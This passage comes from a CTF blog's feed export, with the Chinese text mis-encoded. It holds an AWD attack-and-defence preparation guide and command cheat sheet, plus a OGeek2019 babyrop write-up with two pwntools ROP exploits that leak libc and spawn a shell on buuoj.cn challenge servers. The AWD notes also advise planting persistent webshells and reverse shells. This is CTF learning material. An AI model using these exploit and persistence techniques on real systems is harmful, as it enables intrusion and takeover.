class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc + lib.search(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>).<span class="hljs-built_in">next</span>()<br>sh.recvuntil(<span class="hljs-string">&quot;!&quot;</span>)<br>sh.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>payload = <span class="hljs-string">&#x27;\x00&#x27;</span> + offset * <span class="hljs-string">&quot;a&quot;</span><br>payload += p64(pop_rdi_ret)<br>payload += p64(binsh)<br>payload += p64(system + <span class="hljs-number">0x1b</span> )<br>payload += p64(<span class="hljs-number">0xdeadbeef</span>)<br>sh.sendline(payload)<br><br>log.success(<span class="hljs-string">&quot;__libc_start_main: &quot;</span> + <span class="hljs-built_in">hex</span>(__libc_start_main))<br><br>sh.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>AWDå‡†å¤‡</title>
    <link href="/2020/01/13/AWD%E5%87%86%E5%A4%87/"/>
    <url>/2020/01/13/AWD%E5%87%86%E5%A4%87/</url>
    
    <content type="html"><![CDATA[<h2 id="æ¢æµ‹ä¸»æœº"><a href="#æ¢æµ‹ä¸»æœº" class="headerlink" title="æ¢æµ‹ä¸»æœº"></a>æ¢æµ‹ä¸»æœº</h2><p>Nmapæˆ–HTTPScan</p><p>Nmapæ‰«æç«¯å£</p><h2 id="ç«¯å£æ”»å‡»"><a href="#ç«¯å£æ”»å‡»" class="headerlink" title="ç«¯å£æ”»å‡»"></a>ç«¯å£æ”»å‡»</h2><p>å¸¸è§ï¼š22ï¼Œ2389ï¼Œ1443ï¼Œ3306</p><p>==å‡†å¤‡çˆ†ç ´è„šæœ¬ï¼ï¼ï¼==</p><h2 id="WEBæ”»å‡»"><a href="#WEBæ”»å‡»" class="headerlink" title="WEBæ”»å‡»"></a>WEBæ”»å‡»</h2><blockquote><p>Web æ–¹é¢çš„è¯­è¨€å¤šä¸º PHPï¼Œå°éƒ¨åˆ†ä¸º Java å’Œ Pythonã€‚è¿™é‡Œçš„ Web ç¯å¢ƒåˆ†ä¸¤ç§æƒ…å†µï¼Œä¸€ç§æ˜¯å·²æœ‰æ¼æ´çš„æ¡†æ¶ï¼Œä¸€ç§æ˜¯å‡ºé¢˜äººå†™çš„æ¡†æ¶ã€‚</p><p>å¦‚æœæ˜¯å·²æœ‰æ¼æ´çš„æ¡†æ¶ï¼Œé€šå¸¸ä¼šæ¯”è¾ƒæ˜æ˜¾ã€‚æ¯”å¦‚è¯´ Struts 2 å„ç§æ¼æ´ç­‰ç­‰ï¼Œç”¨å·¥å…·æ‰«å°±å¯ä»¥æ‰«å‡ºæ¥ã€‚è¿™ä¸ªéœ€è¦å‡†å¤‡å¾—æ¯”è¾ƒå……åˆ†ï¼Œåœ¨ç”µè„‘ä¸­å¤‡å¥½ EXP åº“ã€æ¼æ´åº“å’Œå„ç§æ‰«æå·¥å…·åº“ï¼Œä»¥ä¾¿èƒ½å¤Ÿå¿«é€Ÿåˆ©ç”¨æ¯”è¾ƒæ˜æ˜¾çš„æ¼æ´ã€‚æ€»ä¹‹æ‰‹è¦å¿«ï¼</p><p>å¦‚æœæ˜¯å‡ºé¢˜äººå‡ºçš„æ¡†æ¶ï¼Œå¸¸ç”¨å¹¶ä¸”ç®€å•æœ‰æ•ˆçš„åšæ³•æ˜¯æŠŠæ•´ç«™æºç ä¸‹è½½ä¸‹æ¥ï¼Œç›´æ¥ç”¨å·¥å…·å®¡è®¡ã€‚ä»¥ PHP ä¸¾ä¾‹ï¼Œä¸€èˆ¬çš„æµç¨‹æ˜¯å…ˆDç›¾æŸ¥æ€ï¼Œå‘ç°æœ‰å¸¦æœ‰é¢„ç•™åé—¨æˆ–è€… Webshell é©¬ä¸ŠæŠ¥ç»™é˜²å®ˆé˜Ÿå‹è¿›è¡ŒåŠ å›ºã€‚</p><p>æŠŠåé—¨çš„é—®é¢˜æå®šã€é˜²æ­¢åˆ«äººå¿«é€Ÿæ‹¿åˆ†åï¼Œå…¶æ¬¡æ‰æ˜¯æºç å®¡è®¡ï¼Œå‘ç°é—®é¢˜ç‚¹åè¿…é€ŸéªŒè¯ï¼ŒæŠ¥ç»™é˜²å®ˆé˜Ÿå‹ï¼Œå¹¶ä¸”å¼€å§‹å†™æ”»å‡»è„šæœ¬ã€‚ä»¥ PHP ä¸¾ä¾‹ï¼Œä¸€èˆ¬æ˜¯ä½¿ç”¨ Seay ç­‰æºç å®¡è®¡å·¥å…·ï¼Œå®¡æ ¸å‡ºæ¯”è¾ƒæ˜æ˜¾çš„æ¼æ´ã€‚</p><p>å®Œæˆäº†å·¥å…·æ‰«æåï¼Œå¼€å§‹å¸¸è§„çš„æ¸—é€æµ‹è¯•ï¼Œæ¯”å¦‚è¯´æ–‡ä»¶ä¸Šä¼ ã€SQL æ³¨å…¥ç­‰ç­‰ï¼Œçœ‹æ˜¯å¦èƒ½ç»•è¿‡ï¼Œæ‰¾åˆ°ä¸€ä¸ªç‚¹é©¬ä¸Šå†™åˆ©ç”¨è„šæœ¬ã€‚<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œneversecã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ª CC 4.0 BY-SA ç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚<br>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/github_35912913/article/details/89336506">https://blog.csdn.net/github_35912913/article/details/89336506</a></p></blockquote><h2 id="ç»´æŒæƒé™"><a href="#ç»´æŒæƒé™" class="headerlink" title="ç»´æŒæƒé™"></a>ç»´æŒæƒé™</h2><p>AWDä¼˜å…ˆç§ä¸æ­»é©¬ï¼Œåå¼¹shell</p><blockquote><p>ä¸æ­»é©¬ï¼šä¸æ–­åœ¨è¯¥è·¯å¾„ç”Ÿæˆshellï¼Œç”¨äºå·¥å…·è¿æ¥</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> / -name <span class="hljs-number">*f</span>lag*<br>grep -rn <span class="hljs-string">&quot;flag&quot;</span> *<br></code></pre></td></tr></table></figure><h2 id="é˜²å®ˆ"><a href="#é˜²å®ˆ" class="headerlink" title="é˜²å®ˆ"></a>é˜²å®ˆ</h2><ul><li><p>å¤‡ä»½æºç å’Œæ•°æ®åº“</p></li><li><p>ç³»ç»Ÿå®‰å…¨æ€§æ£€æŸ¥ã€‚å…³é—­3306ï¼ï¼ã€é™åˆ¶sshç™»å½•ï¼Œä¿®æ”¹sshå¯†ç ï¼ŒMysqlæ˜¯å¦é»˜è®¤å¯†ç ==å†™è„šæœ¬åˆ·!==</p></li><li><p>éƒ¨ç½²WAF@zx</p></li><li><p>ä¿®æ”¹æƒé™ã€‚ä¿®æ”¹Mysqlæƒé™ç­‰ã€‚</p></li><li><blockquote><p>ç›‘æ§å¯è¯»å†™æƒé™çš„ç›®å½•æ˜¯å¦æ–°å¢ã€åˆ é™¤æ–‡ä»¶å¹¶åŠæ—¶æé†’ã€‚è¿™é‡Œè¯´ä¸‹ï¼Œå¦‚æœè¢«ç§äº†ä¸æ­»é©¬çš„è¯é€šå¸¸æœ‰ä»¥ä¸‹å‡ ç§å…‹åˆ¶æ–¹æ³•ã€‚</p><ul><li><p>å¼ºè¡Œ kill æ‰è¿›ç¨‹åé‡å¯æœåŠ¡</p></li><li><p>å»ºç«‹ä¸€ä¸ªå’Œä¸æ­»é©¬ç›¸åŒåå­—çš„æ–‡ä»¶æˆ–è€…ç›®å½•</p></li><li><p>å†™è„šæœ¬ä¸æ–­åˆ é™¤æ–‡ä»¶</p></li><li><p>ä¸æ–­å†™å…¥ä¸€ä¸ªå’Œä¸æ­»é©¬åŒåçš„æ–‡ä»¶</p></li></ul><ol start="6"><li>éƒ¨ç½²æµé‡ç›‘æ§è„šæœ¬æˆ–å¼€å¯æœåŠ¡å™¨æ—¥å¿—è®°å½•ã€‚ç›®çš„ä¸»è¦æ˜¯ä¸ºäº†è¿›è¡Œæµé‡å›æ”¾ï¼Œçœ‹å…¶å®ƒå¤§ä½¬å¦‚ä½•ç”¨æˆ‘ä»¬æ²¡å‘ç°çš„æ¼æ´æ¥æ‰“æˆ‘ä»¬çš„æœºå­ï¼ŒæŠ“å–åˆ°ä¹‹åæŠŠçœ‹ä¸æ‡‚çš„æµé‡ç›´æ¥å›æ”¾åˆ°åˆ«çš„æœºå­å»ï¼Œè¿™é‡Œè¿˜å¾—æåˆ°ï¼Œæˆ‘ä»¬è‡ªå·±åœ¨æ”»å‡»çš„æ—¶å€™ï¼Œä¹Ÿè¦è¯•ç€æ··æ·†ä¸€ä¸‹è‡ªå·±çš„æ”»å‡»æµé‡ï¼Œä¸èƒ½è½»æ˜“è¢«åˆ«äººåˆ©ç”¨ã€‚<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œneversecã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ª CC 4.0 BY-SA ç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚<br>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/github_35912913/article/details/89336506">https://blog.csdn.net/github_35912913/article/details/89336506</a></li></ol></blockquote></li><li><p>æµé‡ç›‘æ§è„šæœ¬</p></li></ul><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>1.æœåŠ¡å™¨æ‰€éœ€è¦çš„è½¯ä»¶åŒ…ï¼Œé¿å…æœåŠ¡å™¨ä¸Šæ²¡æœ‰</p><p>2.EXPå’Œæ¼æ´åº“</p><p>3.åŠ å›ºã€åŸºçº¿æ£€æŸ¥æ¼æ´</p><p>4.WAFä»£ç å’Œéƒ¨ç½²è„šæœ¬</p><p>5.æ‰¹é‡æ‹¿shellã€æäº¤flagã€ç»´æŒæƒé™çš„ä»£ç æˆ–å°æ¡†æ¶</p><p><strong>è½¯ä»¶åŒ…ä¹Ÿå¾—çœ‹ç»™ä½ çš„æœåŠ¡å™¨æœ‰æ— è¶³å¤Ÿçš„æƒé™å»è¿è¡Œ</strong></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>AWD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>AWDå¸¸ç”¨æŒ‡ä»¤</title>
    <link href="/2020/01/13/AWD%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
    <url>/2020/01/13/AWD%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>å¤‡ä»½webç›®å½•</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">tar -zcvf web.tar.gz <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹å·²å»ºç«‹ç½‘ç»œè¿æ¥å’Œå¯¹åº”è¿›ç¨‹</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">netstat -antulp <span class="hljs-string">| grep EST</span><br></code></pre></td></tr></table></figure><p>ç”¨æˆ·ç®¡ç†</p><p>w    æŸ¥çœ‹å½“å‰ç”¨æˆ·</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">pkill -kill -t <span class="hljs-tag">&lt;<span class="hljs-name">Username</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æŒ‡å®šç«¯å£è¢«å“ªä¸ªè¿›ç¨‹å ç”¨</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">lsof -i:ç«¯å£å· æˆ–è€… netstat -tunlp<span class="hljs-string">|grep ç«¯å£å·</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#å¤‡ä»½mysqlæ•°æ®åº“<br>mysqldump -u ç”¨æˆ·å -<span class="hljs-selector-tag">p</span> å¯†ç  æ•°æ®åº“å &gt; back<span class="hljs-selector-class">.sql</span>ã€€ã€€ã€€ã€€<br>mysqldump --all-databases &gt; bak<span class="hljs-selector-class">.sql</span>ã€€ã€€ã€€ã€€ã€€ã€€<br>#è¿˜åŸmysqlæ•°æ®åº“<br>mysql -u ç”¨æˆ·å -<span class="hljs-selector-tag">p</span> å¯†ç  æ•°æ®åº“å &lt; bak<span class="hljs-selector-class">.sql</span>ã€€ã€€<br>find / *<span class="hljs-selector-class">.php</span> -perm  ã€€ã€€ ã€€ã€€<br>awk -F:  /etc/passwdã€€ã€€ã€€ã€€<br>crontab -lã€€ã€€ã€€<br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs #ç»“æŸè¿›ç¨‹å‘½ä»¤">#æ£€æµ‹æ‰€æœ‰çš„tcpè¿æ¥æ•°é‡åŠçŠ¶æ€<br>netstat -ant|awk  |grep |sed -e  -e |sort|uniq -c|sort -rn<br>#æŸ¥çœ‹é¡µé¢è®¿é—®æ’åå‰åçš„IP<br>cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log | cut -f1 -d   | sort | uniq -c | sort -k  -r | head -ã€€ã€€<br>#æŸ¥çœ‹é¡µé¢è®¿é—®æ’åå‰åçš„URL<br>cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log | cut -f4 -d   | sort | uniq -c | sort -k  -r | head -<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">#å°æ€æŸä¸ªIPæˆ–è€…ipæ®µï¼Œå¦‚ï¼š.ã€€ã€€<br>iptables -<span class="hljs-selector-tag">I</span> <span class="hljs-selector-tag">INPUT</span> -s . -j DROP<br>iptables -<span class="hljs-selector-tag">I</span> <span class="hljs-selector-tag">INPUT</span> -s ./ -j DROP<br>#ç¦æ­¢ä»æŸä¸ªä¸»æœºsshè¿œç¨‹è®¿é—®ç™»é™†åˆ°æœ¬æœºï¼Œå¦‚<span class="hljs-number">123</span>..ã€€ã€€<br>iptable -t <span class="hljs-attribute">filter</span> -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -s . -<span class="hljs-selector-tag">p</span> tcp --dport  -j DROPã€€ã€€<br></code></pre></td></tr></table></figure><p><strong>å°æ€ipä¸€æ—¦å‘ç°ç›´æ¥å–æ¶ˆæ¯”èµ›èµ„æ ¼çš„ï¼Œè½¬å‘æµé‡ä¹Ÿæ˜¯</strong></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>AWD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>OGeek2019-babyrop</title>
    <link href="/2020/01/13/OGeek2019-babyrop/"/>
    <url>/2020/01/13/OGeek2019-babyrop/</url>
    
    <content type="html"><![CDATA[<img src="/2020/01/13/OGeek2019-babyrop/image-20200109113815190.png" class="" title="image-20200109113815190"><h2 id="ç¨‹åº"><a href="#ç¨‹åº" class="headerlink" title="ç¨‹åº"></a>ç¨‹åº</h2><img src="/2020/01/13/OGeek2019-babyrop/image-20200109113247829.png" class="" title="image-20200109113247829"><img src="/2020/01/13/OGeek2019-babyrop/image-20200109113307666.png" class="" title="image-20200109113307666"><p>ä¸ºäº†ç»•è¿‡strncmpï¼Œæˆ‘ä»¬åœ¨v6è¿™é‡Œå¯ä»¥æ”¾ä¸€ä¸ª\x00 å› ä¸ºstrlenä¼šåœ¨è¯†åˆ«åˆ°\x00ä¹‹ååœæ­¢ï¼Œè¿™æ ·strncmpå°±ä¼šé»˜è®¤è¿”å›0</p><img src="/2020/01/13/OGeek2019-babyrop/image-20200109113459963.png" class="" title="image-20200109113459963"><p>è¿™é‡Œçš„v5è¿”å›å€¼åˆè·Ÿä¸‹é¢çš„a1æ˜¯ä¸€è‡´çš„</p><img src="/2020/01/13/OGeek2019-babyrop/image-20200109113326191.png" class="" title="image-20200109113326191"><img src="/2020/01/13/OGeek2019-babyrop/image-20200109113733376.png" class="" title="image-20200109113733376"><p>è¿™é‡Œä¹Ÿæ²¡æœ‰å•¥å¯ä»¥è°ƒç”¨çš„</p><p>é‚£å°±æ˜¯ropï¼Œleak libcäº†</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><h3 id="leak-libcç‰ˆ"><a href="#leak-libcç‰ˆ" class="headerlink" title="leak libcç‰ˆ"></a>leak libcç‰ˆ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2.7</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;[OGeek2019]babyrop&#x27;</span>)<br>lib = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>sh = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">ip,port,debug</span>):</span><br>    <span class="hljs-keyword">global</span> lib<br>    <span class="hljs-keyword">global</span> sh<br>    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>        sh = process(<span class="hljs-string">&#x27;./[OGeek2019]babyrop&#x27;</span>)<br>        lib = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        sh = remote(ip,port)<br>        lib = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>    main_start = <span class="hljs-number">0x8048825</span><br>    write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    pop_ret = <span class="hljs-number">0x80488F9</span><br>    libc = elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>    payload = <span class="hljs-string">&quot;\x00&quot;</span><br>    payload += <span class="hljs-string">&quot;\xff&quot;</span> * <span class="hljs-number">7</span><br>    sh.sendline(payload)<br>    <br>    sh.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>    payload = cyclic(<span class="hljs-number">0xE7</span> + <span class="hljs-number">0x4</span>)<br>    payload += p32(write_plt)<br>    payload += p32(pop_ret)<br>    payload += p32(<span class="hljs-number">1</span>)<br>    payload += p32(libc)<br>    payload += p32(<span class="hljs-number">4</span>)<br>    payload += p32(main_start)<br>    sh.sendline(payload)<br><br>    __libc_start_main = u32(sh.recv(<span class="hljs-number">4</span>))<br>    libc = __libc_start_main - lib.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>    system = libc + lib.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    binsh = libc + lib.search(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>).<span class="hljs-built_in">next</span>()<br><br>    log.success(<span class="hljs-string">&quot;libc: &quot;</span> + <span class="hljs-built_in">hex</span>(libc))<br>    log.success(<span class="hljs-string">&quot;system: &quot;</span> + <span class="hljs-built_in">hex</span>(system))<br>    log.success(<span class="hljs-string">&quot;binsh: &quot;</span> + <span class="hljs-built_in">hex</span>(binsh))<br><br>    payload = <span class="hljs-string">&quot;\x00&quot;</span><br>    payload += <span class="hljs-string">&quot;\xff&quot;</span> * <span class="hljs-number">7</span><br>    sh.sendline(payload)<br>    <br>    sh.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>    payload = cyclic(<span class="hljs-number">0xE7</span> + <span class="hljs-number">0x4</span>)<br>    payload += p32(system)<br>    payload += p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload += p32(binsh)<br>    sh.sendline(payload)<br>    sh.interactive()<br><span class="hljs-keyword">if</span> __name__ ==  <span class="hljs-string">&quot;__main__&quot;</span>:<br>    pwn(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29257</span>,<span class="hljs-number">0</span> )<br></code></pre></td></tr></table></figure><h3 id="leak-write"><a href="#leak-write" class="headerlink" title="leak write"></a>leak write</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2.7</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;[OGeek2019]babyrop&#x27;</span>)<br>lib = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>sh = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">ip,port,debug</span>):</span><br>    <span class="hljs-keyword">global</span> lib<br>    <span class="hljs-keyword">global</span> sh<br>    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>        sh = process(<span class="hljs-string">&#x27;./[OGeek2019]babyrop&#x27;</span>)<br>        lib = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        sh = remote(ip,port)<br>        lib = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>    main_start = <span class="hljs-number">0x8048825</span><br>    write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    pop_ret = <span class="hljs-number">0x80488F9</span><br><br>    payload = <span class="hljs-string">&quot;\x00&quot;</span><br>    payload += <span class="hljs-string">&quot;\xff&quot;</span> * <span class="hljs-number">7</span><br>    sh.sendline(payload)<br>    <br>    sh.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>    payload = cyclic(<span class="hljs-number">0xE7</span> + <span class="hljs-number">0x4</span>)<br>    payload += p32(write_plt)<br>    payload += p32(pop_ret)<br>    payload += p32(<span class="hljs-number">1</span>)<br>    payload += p32(write_got)<br>    payload += p32(<span class="hljs-number">4</span>)<br>    payload += p32(main_start)<br>    sh.sendline(payload)<br><br>    write_addr = u32(sh.recv(<span class="hljs-number">4</span>))<br>    libc = write_addr - lib.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    system = libc + lib.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    binsh = libc + lib.search(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>).<span class="hljs-built_in">next</span>()<br><br>    log.success(<span class="hljs-string">&quot;libc: &quot;</span> + <span class="hljs-built_in">hex</span>(libc))<br>    log.success(<span class="hljs-string">&quot;system: &quot;</span> + <span class="hljs-built_in">hex</span>(system))<br>    log.success(<span class="hljs-string">&quot;binsh: &quot;</span> + <span class="hljs-built_in">hex</span>(binsh))<br><br>    payload = <span class="hljs-string">&quot;\x00&quot;</span><br>    payload += <span class="hljs-string">&quot;\xff&quot;</span> * <span class="hljs-number">7</span><br>    sh.sendline(payload)<br>    <br>    sh.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>    payload = cyclic(<span class="hljs-number">0xE7</span> + <span class="hljs-number">0x4</span>)<br>    payload += p32(system)<br>    payload += p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload += p32(binsh)<br>    sh.sendline(payload)<br>    sh.interactive()<br><span class="hljs-keyword">if</span> __name__ ==  <span class="hljs-string">&quot;__main__&quot;</span>:<br>    pwn(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29257</span>,<span class="hljs-number">0</span>)<br><br></code></pre></td></tr></table></figure><h2 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h2><h2 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf"></a>sprintf</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br> <span class="hljs-keyword">char</span> a[] = &#123;<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>&#125;;<br>   <span class="hljs-keyword">char</span> b[] = &#123;<span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>&#125;;<br>   <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">10</span>];<br>  <span class="hljs-built_in">sprintf</span>(buffer, <span class="hljs-string">&quot;%.4s%.4s&quot;</span>, a, b);<br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buffer);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><img src="/2020/01/13/OGeek2019-babyrop/SouthEast.png" class="" title="img"><p>å°†abå†™å…¥buffer</p><h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><p>ssize_t read (int fd, void *buf, size_t 